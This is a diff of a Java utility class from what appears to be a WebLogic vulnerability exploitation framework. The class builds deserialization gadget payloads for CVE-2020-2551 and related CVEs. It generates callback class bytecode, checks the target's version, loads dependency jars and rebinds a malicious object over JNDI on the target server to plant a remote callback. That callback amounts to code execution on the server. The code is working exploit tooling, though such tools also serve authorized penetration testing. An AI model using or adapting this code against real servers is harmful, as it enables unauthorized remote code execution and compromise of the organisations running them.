@@ -15,24 +15,19 @@
 
 package com.weblogic.framework.utils;
 
-import com.weblogic.framework.call.Call;
 import com.weblogic.framework.entity.ContextPojo;
 import com.weblogic.framework.entity.GadgetParam;
 import com.weblogic.framework.entity.MyException;
 import com.weblogic.framework.gadget.ObjectGadget;
 import com.weblogic.framework.entity.VulCheckParam;
-import com.weblogic.framework.vuls.impl.CVE_2020_2883;
 import com.weblogic.framework.vuls.VulTest;
+import com.weblogic.framework.vuls.impl.CVE_2020_2551;
 import javassist.ClassPool;
 import javassist.CtClass;
-import javassist.CtField;
-import javassist.NotFoundException;
-
 import javax.naming.Context;
 import java.net.URL;
 import java.net.URLClassLoader;
 import java.rmi.Remote;
-
 import static com.weblogic.framework.config.CharsetConfig.defaultCharsetName;
 import static com.weblogic.framework.utils.CallUtils.*;
 import static com.weblogic.framework.utils.ClassLoaderUtils.loadJar;
@@ -42,6 +37,7 @@ import static com.weblogic.framework.utils.UrlUtils.buildJNDIUrl;
 import static com.weblogic.framework.utils.UrlUtils.checkJavascriptUrl;
 import static com.weblogic.framework.utils.VersionUtils.checkVersion;
 import static com.weblogic.framework.utils.VersionUtils.getVersion;
+import static com.weblogic.framework.vuls.impl.CVE_2020_2551.STATIC_BIND_NAME;
 import static org.apache.commons.lang3.StringUtils.isBlank;
 
 /**
@@ -74,12 +70,6 @@ public class PayloadUtils {
         return null;
     }
 
-    public static Object generatePayload(final Class<? extends ObjectGadget<?>> clazz, VulCheckParam vulCheckParam) throws Exception {
-        ObjectGadget<?> payload = clazz.newInstance();
-//        payload.getObject();
-        return null;
-    }
-
     /**
      * 通用漏洞验证
      * @param url url
@@ -90,35 +80,32 @@ public class PayloadUtils {
      * @throws Exception
      */
     public static Boolean baseVulnerable(String url, final Class<? extends ObjectGadget<?>> gadgetClazz, final VulTest vulTest, VulCheckParam vulCheckParam) throws Exception{
-
         if(vulCheckParam == null){
             vulCheckParam = new VulCheckParam();
             vulCheckParam.setCharsetName(defaultCharsetName);
             vulCheckParam.setCallName(DEFAULT_CALL);
-            URL checkURL = new URL(url);
-            vulCheckParam.setVersion(getVersion(checkURL.getHost(), checkURL.getPort() == -1 ? 80: checkURL.getPort()));
+            URL targetUrl = new URL(url);
+            vulCheckParam.setVersion(getVersion(targetUrl.getHost(), targetUrl.getPort() == -1 ? 80: targetUrl.getPort()));
         }
         String version = vulCheckParam.getVersion();
         version = isBlank(version) ? "10.3.6.0" :version;
-        String[] VUL_VERSIONS = (String[]) ReflectionUtils.getFieldValue(vulTest, "VUL_VERSIONS");
-        String[] VUL_DEPENDENCIES = (String[]) ReflectionUtils.getFieldValue(vulTest, "VUL_DEPENDENCIES");
-        Boolean versionFlag = checkVersion(version,VUL_VERSIONS);
+        String[] vulVersions = (String[]) ReflectionUtils.getFieldValue(vulTest, "VUL_VERSIONS");
+        String[] vulDependencies = (String[]) ReflectionUtils.getFieldValue(vulTest, "VUL_DEPENDENCIES");
+        Boolean versionFlag = checkVersion(version,vulVersions);
         if(!versionFlag){
             return false;
         }
-        String javascriptUrl = "";
-        if(version.contains("12.1.3.0")){
-            javascriptUrl = "";
-        }else{
-            if(isBlank(vulCheckParam.getJavascriptUrl()) && !version.contains("10.3.6")){
-                throw new MyException("javascript.jar 链接不能为空");
-            }
-            if(!version.contains("10.3.6") && !version.contains("10.3.5")){
-                checkJavascriptUrl(vulCheckParam.getJavascriptUrl());
-            }
-            javascriptUrl = vulCheckParam.getJavascriptUrl();
+        String[] versionArr = version.split("\\.");
+        if(versionArr.length < 2){
+            throw new MyException("版本获取错误");
         }
-        URLClassLoader urlClassLoader = loadJar(version,VUL_DEPENDENCIES);
+        String javascriptUrl = "";
+        if(Integer.parseInt(versionArr[0]) > 11 && Integer.parseInt(versionArr[1]) > 1){
+            if (isBlank(vulCheckParam.getJavascriptUrl())){
+                throw new MyException("javascript URL 不能为空！");
+            }
+        }
+        URLClassLoader urlClassLoader = loadJar(version,vulDependencies);
         // 编码，默认根据用户的操作系统提取
         String charsetName = isBlank(vulCheckParam.getCharsetName()) ? defaultCharsetName : vulCheckParam.getCharsetName();
         // 回调类名称，默认为 ClusterMasterRemote
@@ -126,6 +113,9 @@ public class PayloadUtils {
         // 构建回调类字节码
         byte[] bytes = buildBytes(callName);
         String bindName = getRandomString(16);
+        if(vulTest instanceof CVE_2020_2551){
+            bindName = STATIC_BIND_NAME;
+        }
         Class<? extends Remote> callClazz = CALL_MAP.get(callName);
         ObjectGadget gadget = gadgetClazz.newInstance();
         GadgetParam gadgetParam = new GadgetParam();
@@ -133,13 +123,14 @@ public class PayloadUtils {
         gadgetParam.setCodeByte(bytes);
         gadgetParam.setClassName(callClazz.getSimpleName());
         gadgetParam.setUrlClassLoader(urlClassLoader);
+        gadgetParam.setJndiUrl(vulCheckParam.getJndiUrl());
         Object sendObject = gadget.getObject(gadgetParam);
         String jndiUrl = buildJNDIUrl(url, vulCheckParam.getProtocol());
         ContextPojo contextPojo = null;
         try{
             contextPojo = rebind(jndiUrl, sendObject, urlClassLoader);
         }catch (Exception e){
-            // TODO:
+            //
         }
         if(contextPojo == null || contextPojo.getContext() == null || contextPojo.getUrlClassLoader() == null){
             return false;
@@ -163,7 +154,10 @@ public class PayloadUtils {
     }
 
     public static void main(String[] args) throws Exception {
-        generatePocCall(null,"123143124");
+        for (String callName:CALL_MAP.keySet()) {
+            generatePocCall(callName,"testInfo");
+            System.out.println("generatePocCall --> "+callName+ "ok!");
+        }
     }
 
 }
